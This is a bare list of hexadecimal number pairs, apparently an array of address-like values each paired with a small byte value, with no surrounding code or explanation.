0x00F0C830, 0x0000001D, 0x00F0F508, 0x00000035, 0x00F0CCD0, 0x00000072, 0x00F0FF68, 0x00000070, 0x00F0B308, 0x00000046, 0x00F0B768, 0x0000005A, 0x00F11840, 0x00000046, 0x00F103D8, 0x00000046, 0x00F124A8, 0x0000000A, 0x00F0F778, 0x0000002E, 0x00F0CFE0, 0x00000061, 0x00F09440, 0x0000006A, 0x00F0E518, 0x00000003, 0x00F0F880, 0x0000003E, 0x00F0D300, 0x00000079, 0x00F10618, 0x00000066, 0x00F0BD48, 0x0000000C, 0x00F0A540, 0x00000001, 0x00F09A28, 0x00000070, 0x00F0ED80, 0x00000005, 0x00F09288, 0x00000002, 0x00F0B5B8, 0x0000002A, 0x00F117A8, 0x0000005E, 0x00F0FD88, 0x0000006A, 0x00F0F140, 0x0000001A, 0x00F0BF38, 0x0000005C, 0x00F0EE30, 0x0000004F, 0x00F0FB90, 0x0000004C, 0x00F09D00, 0x00000071, 0x00F0ADB8, 0x00000025, 0x00F0D1E0, 0x00000009, 0x00F100A0, 0x0000004B, 0x00F0AA38, 0x00000026, 0x00F0B610, 0x00000046, 0x00F126F8, 0x0000007C, 0x00F12018, 0x00000069, 0x00F0D228, 0x00000019, 0x00F0D570, 0x0000005D, 0x00F0C558, 0x00000060, 0x00F12740, 0x0000002A, 0x00F0D290, 0x0000004C, 0x00F0F268, 0x0000005D, 0x00F09290, 0x0000005C, 0x00F0ED80, 0x00000042, 0x00F0AA68, 0x0000006B, 0x00F116B8, 0x00000047, 0x00F0F6B0, 0x00000054, 0x00F0EF98, 0x0000007B, 0x00F11430, 0x00000067, 0x00F10130, 0x00000055, 0x00F10080, 0x00000060, 0x00F11E30, 0x00000021, 0x00F0B1F0, 0x00000033, 0x00F0C348, 0x0000003E, 0x00F11110, 0x0000005F, 0x00F0C888, 0x00000022, 0x00F0A548, 0x00000031, 0x00F0FC90, 0x00000029, 0x00F106E8, 0x00000022, 0x00F0B7C8, 0x00000047, 0x00F0A158, 0x00000029, 0x00F12540, 0x00000025, 0x00F0EFE8, 0x00000041, 0x00F0B5F8, 0x0000000C, 0x00F0C840, 0x0000006F, 0x00F0FEA8, 0x00000064, 0x00F0AC40, 0x00000009, 0x00F10980, 0x00000017, 0x00F0C6D0, 0x0000001D, 0x00F09B88, 0x00000000, 0x00F0ADD0, 0x00000010, 0x00F0C718, 0x00000058, 0x00F0B938, 0x0000007E, 0x00F11FE8, 0x00000056, 0x00F0A4E0, 0x00000063, 0x00F11EB0, 0x00000037, 0x00F0F000, 0x0000000C, 0x00F0B288, 0x0000001F, 0x00F10A40, 0x0000005E, 0x00F103C8, 0x00000074, 0x00F0A618, 0x00000009, 0x00F0D8F8, 0x00000016, 0x00F0B1B8, 0x00000011, 0x00F0FF88, 0x00000023, 0x00F0AB50, 0x00000049, 0x00F11C28, 0x00000038, 0x00F0B0D8, 0x00000057, 0x00F0F038, 0x0000003D, 0x00F0A950, 0x00000013, 0x00F0B178, 0x0000003A, 0x00F0A1F0, 0x00000011, 0x00F120F8, 0x0000005B, 0x00F0A2F0, 0x0000001C, 0x00F0D5D8, 0x00000004, 0x00F0C348, 0x00000060, 0x00F11A08, 0x0000001A, 0x00F0D8C8, 0x00000029, 0x00F0F518, 0x0000006A, 0x00F0FE28, 0x00000033, 0x00F0D698, 0x0000007D, 0x00F0C378, 0x00000056, 0x00F097B0, 0x00000068, 0x00F109B0, 0x0000003D, 0x00F0EB60, 0x00000023, 0x00F0DA20, 0x00000074, 0x00F12640, 0x0000000D, 0x00F0A690, 0x00000037, 0x00F12698, 0x00000065, 0x00F09398, 0x00000008, 0x00F0FB68, 0x0000000A, 0x00F0D2F8, 0x00000028, 0x00F09F70, 0x00000043, 0x00F0D688, 0x00000068, 0x00F0BA10, 0x00000058, 0x00F10610, 0x0000005C, 0x00F0DB60, 0x0000004D, 0x00F0BE78, 0x00000008, 0x00F0A860, 0x00000079, 0x00F11E48, 0x00000074, 0x00F0B518, 0x0000004A, 0x00F0FB60, 0x00000053, 0x00F0DAB8, 0x00000073, 0x00F0EFD0, 0x00000016, 0x00F10A90, 0x0000006C, 0x00F0D608, 0x00000029, 0x00F0EB80, 0x0000004E, 0x00F0BAD0, 0x00000036, 0x00F0A408, 0x00000023, 0x00F09958, 0x00000009, 0x00F0CCD8, 0x0000002F, 0x00F121F8, 0x00000019, 0x00F0CDA0, 0x0000001C, 0x00F125E0, 0x0000004B, 0x00F10870, 0x0000003F, 0x00F09C68, 0x00000056, 0x00F127A0, 0x0000005A, 0x00F0B510, 0x00000002, 0x00F0D6E0, 0x0000007D, 0x00F0FEE8, 0x0000000F, 0x00F092F0, 0x0000006F, 0x00F10F30, 0x00000001, 0x00F0B998, 0x00000052, 0x00F11290, 0x0000003B, 0x00F0C8C8, 0x00000053, 0x00F0D3F0, 0x00000076, 0x00F0E538, 0x00000033, 0x00F0CA50, 0x00000023, 0x00F0F460, 0x0000005F, 0x00F0CAE0, 0x00000033, 0x00F0DB68, 0x00000071, 0x00F0E458, 0x00000064, 0x00F0AAB0, 0x0000005E, 0x00F0ADB0, 0x00000004, 0x00F0AA00, 0x00000019, 0x00F0F098, 0x0000002E, 0x00F0BCA0, 0x00000058, 0x00F0DC60, 0x00000039, 0x00F0B3B8, 0x00000008, 0x00F12AB8, 0x0000005A, 0x00F0F3A8, 0x00000059, 0x00F0F8E0, 0x00000045, 0x00F0F568, 0x0000000C, 0x00F0D3A8, 0x00000057, 0x00F0C3D8, 0x00000071, 0x00F0E808, 0x0000007C, 0x00F0B7C0, 0x0000002E, 0x00F0D688, 0x00000049, 0x00F0F4D0, 0x0000004F, 0x00F0A200, 0x0000007A, 0x00F11098, 0x00000022, 0x00F0C220, 0x0000002A, 0x00F09AF8, 0x00000078, 0x00F0A450, 0x0000001F, 0x00F11CA0, 0x00000042, 0x00F0AC48, 0x00000027, 0x00F12258, 0x0000001D, 0x00F0B8A0, 0x0000002B, 0x00F0E470, 0x00000045, 0x00F0CB30, 0x0000003E, 0x00F0A198, 0x00000019, 0x00F11050, 0x0000000E, 0x00F0E300, 0x00000003, 0x00F0F548, 0x00000052, 0x00F0ADB8, 0x0000000A, 0x00F10780, 0x0000003B, 0x00F090A0, 0x0000005A, 0x00F0AEC0, 0x0000005A, 0x00F099A0, 0x00000004, 0x00F0A478, 0x0000002E, 0x00F10408, 0x0000003C, 0x00F0F2C0, 0x00000031, 0x00F09CE0, 0x0000006F, 0x00F118B0, 0x00000010, 0x00F0AF90, 0x00000058, 0x00F0ED38, 0x00000009, 0x00F0A908, 0x00000002, 0x00F0BE38, 0x00000071, 0x00F0B560, 0x0000005E, 0x00F0D210, 0x0000007D, 0x00F0D930, 0x00000053, 0x00F0BCF0, 0x00000036, 0x00F108A0, 0x0000006D, 0x00F0ADF8, 0x00000043, 0x00F0DD30, 0x0000001C, 0x00F112A8, 0x00000006, 0x00F0ECB8, 0x0000001F, 0x00F0C920, 0x00000076, 0x00F097D0, 0x0000000B, 0x00F0EB98, 0x0000007B, 0x00F0C380, 0x00000022, 0x00F0FD38, 0x0000000D, 0x00F12938, 0x0000003C, 0x00F117C0, 0x0000005F, 0x00F0B468, 0x00000019, 0x00F0BE18, 0x0000006B, 0x00F0B570, 0x00000059, 0x00F0B3D0, 0x0000000E, 0x00F0F8D0, 0x00000071, 0x00F10FD0, 0x00000013, 0x00F0D8D8, 0x0000004A, 0x00F11958, 0x0000006D, 0x00F11928, 0x00000073, 0x00F0ACE8, 0x0000006E, 0x00F0A730, 0x00000013, 0x00F105C8, 0x00000020, 0x00F0B080, 0x0000006B, 0x00F0F5A8, 0x0000004C, 0x00F0EEA8, 0x00000049, 0x00F0CA28, 0x00000031, 0x00F0BE18, 0x00000074, 0x00F0B630, 0x00000065, 0x00F09380, 0x00000034, 0x00F0C1A0, 0x00000006, 0x00F0AAF8, 0x0000005E, 0x00F0B8B8, 0x0000001A, 0x00F0AB58, 0x0000007D, 0x00F0F248, 0x00000059, 0x00F0BD20, 0x00000030, 0x00F11D98, 0x00000036, 0x00F0E640, 0x0000000F, 0x00F0FB88, 0x00000056, 0x00F0EE60, 0x00000063, 0x00F09E18, 0x0000006A, 0x00F09918, 0x0000000A, 0x00F0DB30, 0x00000069, 0x00F0FBA8, 0x0000001C, 0x00F12050, 0x0000005D, 0x00F09E98, 0x0000005F, 0x00F0B420, 0x0000000F, 0x00F10A98, 0x00000017, 0x00F098F8, 0x00000055, 0x00F0A440, 0x0000000E, 0x00F125F8, 0x0000005C, 0x00F0E698, 0x00000035, 0x00F11E78, 0x00000013, 0x00F0E338, 0x00000074, 0x00F0C358, 0x00000026, 0x00F0A048, 0x00000022, 0x00F11A00, 0x0000003A, 0x00F0A278, 0x0000004B, 0x00F0DE18, 0x00000039, 0x00F0A920, 0x0000001E, 0x00F0D578, 0x0000006B, 0x00F10088, 0x00000045, 0x00F12298, 0x0000003F, 0x00F11268, 0x00000067, 0x00F0F318, 0x00000067, 0x00F0DC78, 0x0000003C, 0x00F0CA68, 0x0000003C, 0x00F0D458, 0x00000043, 0x00F0A778, 0x00000071, 0x00F0A2E0, 0x0000001A, 0x00F0E840, 0x00000036, 0x00F0C3D0, 0x00000023, 0x00F0FC60, 0x00000033, 0x00F11960, 0x00000041, 0x00F10B60, 0x00000072, 0x00F111B8, 0x00000074, 0x00F0A6E8, 0x00000050, 0x00F0A638, 0x0000002E, 0x00F0FCB8, 0x00000053, 0x00F0FB28, 0x00000005, 0x00F10808, 0x0000001D, 0x00F0E010, 0x00000031, 0x00F0D358, 0x0000005F, 0x00F09BE0, 0x0000000B, 0x00F0B628, 0x00000069, 0x00F0E638, 0x00000060, 0x00F0F520, 0x0000005C, 0x00F12368, 0x00000050, 0x00F0D078, 0x00000073, 0x00F128C0, 0x00000007, 0x00F0D608, 0x00000014, 0x00F0CF78, 0x00000002, 0x00F0CBA0, 0x00000078, 0x00F0A678, 0x00000052, 0x00F0EE90, 0x00000035, 0x00F09BE0, 0x00000006, 0x00F0C7D8, 0x0000006A, 0x00F0C248, 0x0000007A, 0x00F107D0, 0x00000055, 0x00F0E3A8, 0x0000001D, 0x00F0BAF8, 0x00000038, 0x00F0FF30, 0x0000001E, 0x00F0ED78, 0x0000000F, 0x00F11710, 0x00000079, 0x00F0EE88, 0x00000043, 0x00F10E58, 0x00000023, 0x00F0D110, 0x0000003F, 0x00F11718, 0x0000000A, 0x00F0E060, 0x00000074, 0x00F0B9C8, 0x00000054, 0x00F0EF50, 0x00000071, 0x00F11A50, 0x00000071, 0x00F127F8, 0x0000006A, 0x00F0FC20, 0x00000012, 0x00F09B80, 0x00000059, 0x00F0C8B0, 0x0000007A, 0x00F0D578, 0x00000040, 0x00F0B660, 0x00000035, 0x00F0BC48, 0x00000071, 0x00F0EF10, 0x00000051, 0x00F103D0, 0x00000013, 0x00F0E238, 0x00000000, 0x00F0CA00, 0x00000042, 0x00F10860, 0x00000045, 0x00F094A8, 0x0000007E, 0x00F0FE60, 0x00000032, 0x00F09808, 0x00000040, 0x00F0A7F8, 0x00000031, 0x00F0F4B8, 0x0000005D, 0x00F09790, 0x00000058, 0x00F0F930, 0x0000004A, 0x00F0EBC8, 0x00000007, 0x00F09BA0, 0x00000013, 0x00F09078, 0x00000061, 0x00F0F908, 0x00000051, 0x00F0F068, 0x0000007B, 0x00F0D050, 0x00000077, 0x00F12208, 0x0000006E, 0x00F0CC48, 0x00000013, 0x00F0AA88, 0x00000047, 0x00F09D78, 0x00000077, 0x00F11648, 0x0000005F, 0x00F090E8, 0x0000007E, 0x00F0AA88, 0x00000018, 0x00F0E1D0, 0x00000036, 0x00F0A418, 0x00000012, 0x00F0CD28, 0x00000031, 0x00F0A9D8, 0x00000012, 0x00F0DDE8, 0x00000062, 0x00F0DBC0, 0x00000077, 0x00F0C220, 0x0000001E, 0x00F0B890, 0x0000007C, 0x00F11990, 0x00000034, 0x00F096E0, 0x00000030, 0x00F0DBB0, 0x0000004A, 0x00F0CAD8, 0x00000014, 0x00F104D8, 0x00000067, 0x00F11A00, 0x00000032, 0x00F11340, 0x00000032, 0x00F09718, 0x0000005F, 0x00F0C2F8, 0x00000001, 0x00F0B180, 0x00000073, 0x00F0B4D8, 0x0000003C, 0x00F12978, 0x0000004B, 0x00F0AAE0, 0x00000010, 0x00F0CDF0, 0x0000004C, 0x00F09A68, 0x00000073, 0x00F0CC88, 0x00000046, 0x00F0D240, 0x0000002D, 0x00F09AA8, 0x00000068, 0x00F0C200, 0x00000031, 0x00F11450, 0x00000013, 0x00F10578, 0x00000003, 0x00F0A5C0, 0x00000067, 0x00F11808, 0x0000000A, 0x00F0FF18, 0x0000002F, 0x00F0D540, 0x0000007B, 0x00F11C88, 0x00000014, 0x00F0A9D0, 0x00000048, 0x00F0CF10, 0x00000052, 0x00F0A200, 0x0000001F, 0x00F10610, 0x00000038, 0x00F0B900, 0x00000015, 0x00F109E0, 0x0000002C, 0x00F0C3E8, 0x00000075, 0x00F12938, 0x0000001F, 0x00F0DD68, 0x00000032, 0x00F0D028, 0x00000015, 0x00F0DFA0, 0x00000020, 0x00F0AE48, 0x00000023, 0x00F0A780, 0x0000005E, 0x00F10C08, 0x0000000D, 0x00F10120, 0x0000000B, 0x00F0D2E8, 0x00000070, 0x00F11880, 0x00000052, 0x00F0BB78, 0x0000002E, 0x00F0D948, 0x0000003D, 0x00F0E918, 0x00000057, 0x00F0C368, 0x0000006B, 0x00F0A688, 0x0000006E, 0x00F09250, 0x00000040, 0x00F0BE80, 0x0000004B, 0x00F0C6B8, 0x00000062, 0x00F0CB68, 0x00000055, 0x00F10A98, 0x00000043, 0x00F0A8A0, 0x00000076, 0x00F0E9E8, 0x0000002D, 0x00F103F0, 0x0000006E, 0x00F0A598, 0x0000003C, 0x00F11E68, 0x00000072, 0x00F0D6B8, 0x00000005, 0x00F0CBA0, 0x0000004A, 0x00F0BBB8, 0x0000003F, 0x00F11050, 0x0000002C, 0x00F0ADE0, 0x0000000B, 0x00F0B2C0, 0x00000036, 0x00F0A0E8, 0x00000071, 0x00F12540, 0x00000049, 0x00F0AB28, 0x0000007C, 0x00F0D508, 0x00000072, 0x00F0A2D0, 0x00000015, 0x00F0A1C8, 0x00000054, 0x00F12B00, 0x0000001A, 0x00F0DBD0, 0x0000002D, 0x00F0B2A8, 0x0000003F, 0x00F11C00, 0x0000006C, 0x00F101F0, 0x00000031, 0x00F11708, 0x0000007D, 0x00F0DB50, 0x00000024, 0x00F0DAF0, 0x0000001D, 0x00F12568, 0x0000002D, 0x00F0FB10, 0x00000011, 0x00F09780, 0x0000000F, 0x00F12A40, 0x0000005D, 0x00F0D478, 0x00000065, 0x00F11810, 0x00000077, 0x00F0E158, 0x00000066, 0x00F0A538, 0x00000020, 0x00F0C248, 0x00000078, 0x00F119A0, 0x0000000F, 0x00F09C10, 0x00000070, 0x00F10C38, 0x00000015, 0x00F0DB20, 0x0000004D, 0x00F0D8C0, 0x00000001, 0x00F0B7D0, 0x00000012, 0x00F0BB00, 0x00000001, 0x00F0A400, 0x00000035, 0x00F0EA30, 0x00000073, 0x00F0A890, 0x00000045, 0x00F0E200, 0x00000030, 0x00F0A2A0, 0x0000002D, 0x00F10738, 0x00000056, 0x00F0A0E0, 0x00000032, 0x00F0EF38, 0x0000001A, 0x00F09F40, 0x0000003D, 0x00F0B9E8, 0x0000003D, 0x00F0DB10, 0x00000054, 0x00F0B348, 0x0000000B, 0x00F0F858, 0x0000006B, 0x00F0FB78, 0x0000007C, 0x00F0E738, 0x00000053, 0x00F0B700, 0x0000000D, 0x00F0DE28, 0x0000002D, 0x00F128E8, 0x00000041, 0x00F0E710, 0x00000070, 0x00F0A278, 0x0000005A, 0x00F0CAB0, 0x00000004, 0x00F0B708, 0x00000063, 0x00F0A3B8, 0x00000019, 0x00F092C0, 0x00000070, 0x00F0DB28, 0x00000005, 0x00F0C860, 0x0000004C, 0x00F0B270, 0x00000016, 0x00F0D778, 0x00000056, 0x00F105D0, 0x00000004, 0x00F0CF70, 0x0000007C, 0x00F11F88, 0x00000060, 0x00F0D3E8, 0x00000066, 0x00F0FEE0, 0x00000046, 0x00F0C5B8, 0x0000003E, 0x00F0ED50, 0x0000000E, 0x00F116B0, 0x00000055, 0x00F0B0A0, 0x00000048, 0x00F0CD00, 0x00000064, 0x00F111D8, 0x00000065, 0x00F0FED8, 0x0000003F, 0x00F0DA80, 0x00000018, 0x00F09250, 0x00000034, 0x00F0E520, 0x0000000A, 0x00F0E0C8, 0x00000069, 0x00F122C8, 0x00000056, 0x00F0D128, 0x00000076, 0x00F118C8, 0x00000058, 0x00F0BC00, 0x00000018, 0x00F0B4E8, 0x0000005E, 0x00F0FFD8, 0x0000001C, 0x00F0AE08, 0x00000046, 0x00F0EF20, 0x00000006, 0x00F0D870, 0x0000007E, 0x00F0AAD8, 0x0000007E, 0x00F09700, 0x00000008, 0x00F0EA40, 0x0000007E, 0x00F09648, 0x00000063, 0x00F0C738, 0x0000005B, 0x00F0DB68, 0x0000002B, 0x00F09CF0, 0x0000001B, 0x00F0A900, 0x0000000B, 0x00F0B3F0, 0x00000048, 0x00F09DA8, 0x0000007A, 0x00F0C500, 0x00000010, 0x00F0CF08, 0x00000075, 0x00F0E010, 0x0000006F, 0x00F110B8, 0x00000069, 0x00F0D110, 0x00000038, 0x00F12220, 0x00000056, 0x00F0F058, 0x00000046, 0x00F0B930, 0x00000019, 0x00F11130, 0x00000017, 0x00F0D108, 0x00000000, 0x00F12950, 0x0000000A, 0x00F0E190, 0x0000001C, 0x00F095F8, 0x00000029, 0x00F0BF38, 0x00000065, 0x00F0C3B8, 0x00000035, 0x00F0B370, 0x0000003C, 0x00F0C870, 0x0000002D, 0x00F0BA30, 0x00000035, 0x00F0E218, 0x00000037, 0x00F0E460, 0x0000006C, 0x00F0E580, 0x00000020, 0x00F0EDF0, 0x0000001F, 0x00F0E8B8, 0x00000034, 0x00F0D528, 0x0000005B, 0x00F0C0E8, 0x00000058, 0x00F094F0, 0x0000002C, 0x00F0E420, 0x00000075, 0x00F0BA48, 0x0000002A, 0x00F0D998, 0x00000041, 0x00F09EF8, 0x0000004C, 0x00F0EAC0, 0x0000006B, 0x00F0AE28, 0x0000002C, 0x00F10588, 0x0000002E, 0x00F0BDB0, 0x00000074, 0x00F0A538, 0x0000005C, 0x00F12540, 0x00000070, 0x00F11EE8, 0x0000006A, 0x00F0FED0, 0x00000057, 0x00F0D780, 0x00000029, 0x00F0B0E8, 0x0000003C, 0x00F0E4F0, 0x00000073, 0x00F10FD0, 0x0000004A, 0x00F0ECA0, 0x00000036, 0x00F11D20, 0x00000047, 0x00F10A18, 0x0000006C, 0x00F090F0, 0x0000004F, 0x00F118D0, 0x0000007D, 0x00F10B88, 0x0000000D, 0x00F10A50, 0x0000003E, 0x00F0C278, 0x00000029, 0x00F0E530, 0x0000002C, 0x00F10D98, 0x0000003C, 0x00F0ADC8, 0x00000067, 0x00F09DF8, 0x00000023, 0x00F09E68, 0x0000006A, 0x00F0B0B0, 0x00000047, 0x00F11B48, 0x0000000C, 0x00F0D518, 0x0000006F, 0x00F09D90, 0x00000053, 0x00F0A908, 0x0000000F, 0x00F0C830, 0x00000029, 0x00F11BE8, 0x00000029, 0x00F0DBE8, 0x0000006D, 0x00F0DDC8, 0x00000042, 0x00F0B9C8, 0x0000006E, 0x00F12498, 0x00000079, 0x00F09F38, 0x0000005F, 0x00F0CC68, 0x00000042, 0x00F0B768, 0x00000037, 0x00F0F368, 0x00000050, 0x00F0B038, 0x0000002E, 0x00F0AF40, 0x00000038, 0x00F0BAA8, 0x00000025, 0x00F12758, 0x0000004B, 0x00F12C00, 0x00000034, 0x00F0C690, 0x00000046, 0x00F09268, 0x00000053, 0x00F11F20, 0x00000039, 0x00F0A980, 0x0000001E, 0x00F0C838, 0x00000058, 0x00F109A8, 0x0000003A, 0x00F09880, 0x0000002E, 0x00F114D0, 0x00000013, 0x00F0E930, 0x00000017, 0x00F0F208, 0x0000001E, 0x00F0BAC0, 0x00000052, 0x00F0A328, 0x0000000C, 0x00F0DFD8, 0x00000070, 0x00F0C8D8, 0x0000002B, 0x00F10540, 0x00000042, 0x00F10AE0, 0x0000002E, 0x00F0D670, 0x00000058, 0x00F09FF8, 0x00000034, 0x00F0F060, 0x00000006, 0x00F0A620, 0x00000059, 0x00F0D3D0, 0x00000008, 0x00F0F530, 0x00000004, 0x00F0D840, 0x00000037, 0x00F0E708, 0x00000050, 0x00F0B4F0, 0x00000079, 0x00F0A860, 0x00000055, 0x00F0E370, 0x00000047, 0x00F0D380, 0x00000005, 0x00F095B8, 0x0000007A, 0x00F096D8, 0x00000078, 0x00F11920, 0x00000059, 0x00F10230, 0x0000007A, 0x00F0C6E0, 0x00000057, 0x00F10268, 0x0000007C, 0x00F101D8, 0x00000043, 0x00F0EB00, 0x00000058, 0x00F090C8, 0x0000002A, 0x00F0BF68, 0x00000014, 0x00F10390, 0x00000035, 0x00F0FB08, 0x00000005, 0x00F0DCB0, 0x00000055, 0x00F10938, 0x00000005, 0x00F09148, 0x00000072, 0x00F0C100, 0x00000000, 0x00F10BA8, 0x00000009, 0x00F0CE20, 0x00000049, 0x00F12370, 0x0000003D, 0x00F0A6F8, 0x0000003E, 0x00F10030, 0x00000002, 0x00F10938, 0x00000043, 0x00F121D8, 0x00000047, 0x00F09368, 0x00000036, 0x00F0B930, 0x00000049, 0x00F121D0, 0x0000001C, 0x00F0BDE8, 0x00000066, 0x00F113E0, 0x00000009, 0x00F0D6E0, 0x00000035, 0x00F0F250, 0x00000034, 0x00F0D938, 0x00000042, 0x00F118A0, 0x00000051, 0x00F10D58, 0x00000072, 0x00F0B9F0, 0x00000042, 0x00F0BB70, 0x00000045, 0x00F0CC38, 0x00000002, 0x00F0A358, 0x00000037, 0x00F105E0, 0x0000000A, 0x00F10610, 0x00000015, 0x00F0A590, 0x00000077, 0x00F0F200, 0x0000000F, 0x00F12128, 0x00000039, 0x00F0CAD8, 0x00000035, 0x00F092D0, 0x00000077, 0x00F10200, 0x00000053, 0x00F0F060, 0x0000005A, 0x00F0E310, 0x00000048, 0x00F0ED28, 0x00000031, 0x00F0B1D0, 0x0000003A, 0x00F096D0, 0x00000073, 0x00F0DE20, 0x0000006F, 0x00F099E8, 0x0000003A, 0x00F0B8D8, 0x00000007, 0x00F0CDA8, 0x00000037, 0x00F0D750, 0x00000052, 0x00F11900, 0x0000000B, 0x00F127F8, 0x00000054, 0x00F0D4E0, 0x0000006C, 0x00F09CD8, 0x00000035, 0x00F0A298, 0x00000061, 0x00F097B0, 0x00000011, 0x00F0BD68, 0x00000052, 0x00F10740, 0x00000042, 0x00F0E5D0, 0x0000003E, 0x00F0AE58, 0x0000000C, 0x00F0E2C0, 0x00000051, 0x00F0ABF8, 0x00000066, 0x00F12308, 0x00000043, 0x00F0DDB0, 0x00000021, 0x00F09B88, 0x0000001D, 0x00F0FC50, 0x00000052, 0x00F0B238, 0x00000045, 0x00F114D8, 0x00000013, 0x00F0A990, 0x0000001E, 0x00F0C668, 0x00000022, 0x00F09EB0, 0x0000006C, 0x00F11688, 0x00000071, 0x00F0E070, 0x00000061, 0x00F0C818, 0x00000016, 0x00F0F1A0, 0x00000004, 0x00F0A328, 0x00000033, 0x00F09BF8, 0x0000003A, 0x00F0E050, 0x00000071, 0x00F09728, 0x0000005E, 0x00F0B0E0, 0x00000065, 0x00F0DB48, 0x00000070, 0x00F12710, 0x0000000D, 0x00F09B70, 0x00000061, 0x00F0BA20, 0x00000073, 0x00F0B0E8, 0x0000001F, 0x00F11488, 0x0000005D, 0x00F0B958, 0x00000031, 0x00F0E220, 0x00000027, 0x00F0FCF8, 0x00000032, 0x00F092D0, 0x0000004E, 0x00F10510, 0x00000072, 0x00F11478, 0x0000002F, 0x00F0B580, 0x00000074, 0x00F106D0, 0x0000000F, 0x00F0E570, 0x00000036, 0x00F10BF0, 0x00000053, 0x00F125E8, 0x00000052, 0x00F12610, 0x00000021, 0x00F0CBF0, 0x00000009, 0x00F0D910, 0x00000042, 0x00F0FB28, 0x0000002E, 0x00F0F5F8, 0x00000072, 0x00F0D3D8, 0x00000011, 0x00F0E5B0, 0x00000009, 0x00F0E738, 0x0000005A, 0x00F0AB68, 0x0000001F, 0x00F10968, 0x00000062, 0x00F10A58, 0x0000001F, 0x00F0C410, 0x00000031, 0x00F0C7C0, 0x00000057, 0x00F0D3F8, 0x0000005F, 0x00F0C090, 0x00000019, 0x00F0DDE0, 0x0000004D, 0x00F0D0C8, 0x00000058, 0x00F0D930, 0x00000045, 0x00F0A5F0, 0x00000075, 0x00F0E760, 0x0000006B, 0x00F0F980, 0x00000012, 0x00F11AB0, 0x00000053, 0x00F0D5F0, 0x00000018, 0x00F0D938, 0x00000053, 0x00F0A120, 0x00000069, 0x00F096E8, 0x00000017, 0x00F09240, 0x0000004D, 0x00F0D2F0, 0x00000002, 0x00F0EB60, 0x00000015, 0x00F102F0, 0x00000054, 0x00F0CDC8, 0x00000008, 0x00F0CEF0, 0x0000004F, 0x00F0FD48, 0x00000023, 0x00F0E9B8, 0x0000000B, 0x00F0A030, 0x0000002A, 0x00F11C38, 0x0000005F, 0x00F0A290, 0x00000018, 0x00F0BC58, 0x00000023, 0x00F12770, 0x00000077, 0x00F0E730, 0x00000004, 0x00F0CCB8, 0x0000002D, 0x00F0B8C8, 0x00000037, 0x00F09DB0, 0x0000002B, 0x00F0FCA0, 0x00000065, 0x00F0A330, 0x00000035, 0x00F0BE18, 0x00000079, 0x00F10530, 0x0000001D, 0x00F09BA0, 0x00000031, 0x00F0A508, 0x0000001C, 0x00F0D300, 0x00000038, 0x00F0BDD8, 0x00000026, 0x00F0E248, 0x0000007C, 0x00F094B0, 0x00000008, 0x00F11818, 0x0000001C, 0x00F10768, 0x0000007C, 0x00F09868, 0x00000035, 0x00F09D30, 0x00000018, 0x00F0AB10, 0x00000055, 0x00F0B2A0, 0x00000050, 0x00F0DF58, 0x00000041, 0x00F0CC38, 0x0000004D, 0x00F09FF8, 0x00000015, 0x00F0E108, 0x0000007E, 0x00F0B370, 0x00000031, 0x00F10950, 0x0000007E, 0x00F10C50, 0x00000014, 0x00F0F6F0, 0x00000057, 0x00F12038, 0x0000001E, 0x00F0BEA8, 0x00000008, 0x00F0A9A8, 0x0000003B, 0x00F0A898, 0x0000001B, 0x00F0EE20, 0x0000001F, 0x00F10B88, 0x00000001, 0x00F0D6F8, 0x00000068, 0x00F0F560, 0x00000001, 0x00F0E658, 0x00000068, 0x00F0F268, 0x0000001E, 0x00F0D090, 0x0000005F, 0x00F0B048, 0x00000072, 0x00F0A258, 0x0000007A, 0x00F0F290, 0x0000003A, 0x00F0FE28, 0x00000049, 0x00F0FFA8, 0x00000052, 0x00F118E0, 0x00000006, 0x00F0A028, 0x00000070, 0x00F11050, 0x00000067, 0x00F0DC00, 0x00000072, 0x00F10290, 0x0000005C, 0x00F0B980, 0x00000061, 0x00F0FE48, 0x00000053, 0x00F100A8, 0x00000026, 0x00F0EFE8, 0x0000000B, 0x00F09A08, 0x0000000C, 0x00F09B58, 0x00000071, 0x00F09FA8, 0x00000070, 0x00F117E0, 0x0000001A, 0x00F11A90, 0x00000059, 0x00F11A00, 0x0000006D, 0x00F0F590, 0x00000054, 0x00F0BA70, 0x0000005C, 0x00F09338, 0x00000038, 0x00F0C208, 0x00000070, 0x00F0C160, 0x0000004C, 0x00F0DE78, 0x0000006D, 0x00F0C5A0, 0x0000005C, 0x00F091B8, 0x00000061, 0x00F11E38, 0x0000004F, 0x00F0B488, 0x0000004A, 0x00F0F2E0, 0x00000027, 0x00F11558, 0x0000004E, 0x00F0C298, 0x00000012, 0x00F0B840, 0x00000026, 0x00F10A80, 0x00000017, 0x00F0F088, 0x0000003C, 0x00F0C6F0, 0x00000051, 0x00F0BB60, 0x0000006C, 0x00F09550, 0x00000011, 0x00F0BC38, 0x00000030, 0x00F0B788, 0x00000040, 0x00F11518, 0x00000055, 0x00F0CB08, 0x00000058, 0x00F109B0, 0x0000004C, 0x00F09108, 0x0000006F, 0x00F0FA78, 0x00000077, 0x00F0DA50, 0x00000069, 0x00F10158, 0x00000076, 0x00F0B320, 0x00000062, 0x00F0FCB0, 0x00000025, 0x00F119A0, 0x0000007B, 0x00F0A3F0, 0x0000004A, 0x00F12360, 0x00000048, 0x00F0C868, 0x00000054, 0x00F11FD8, 0x00000063, 0x00F0D628, 0x00000022, 0x00F0BC38, 0x0000006B, 0x00F0D848, 0x00000023, 0x00F0EA08, 0x00000013, 0x00F0C448, 0x0000004A, 0x00F11AC0, 0x00000045, 0x00F0E6B0, 0x00000031, 0x00F0D788, 0x00000046, 0x00F0F778, 0x00000052, 0x00F0E828, 0x00000035, 0x00F0CBA0, 0x00000060, 0x00F0E6D8, 0x00000046, 0x00F11D48, 0x00000069, 0x00F0F9B8, 0x00000051, 0x00F0E0E8, 0x00000067, 0x00F0AE58, 0x0000004A, 0x00F0B918, 0x0000007E, 0x00F0F728, 0x00000064, 0x00F10800, 0x00000066, 0x00F0AD48, 0x00000001, 0x00F0B338, 0x0000005F, 0x00F0DE48, 0x0000007C, 0x00F11B90, 0x0000001D, 0x00F0E450, 0x00000031, 0x00F11B08, 0x00000083, 0x00F106A8, 0x0000004F, 0x00F11360, 0x0000004C, 0x00F0E1D8, 0x0000001E, 0x00F0E178, 0x00000039, 0x00F0AD78, 0x0000001C, 0x00F09650, 0x00000049, 0x00F0CEF0, 0x00000066, 0x00F0A3D8, 0x0000000D, 0x00F0C5E8, 0x00000023, 0x00F0D518, 0x00000051, 0x00F0C640, 0x0000006A, 0x00F11AB8, 0x00000055, 0x00F0A150, 0x00000036, 0x00F09090, 0x0000000B, 0x00F0B898, 0x00000028, 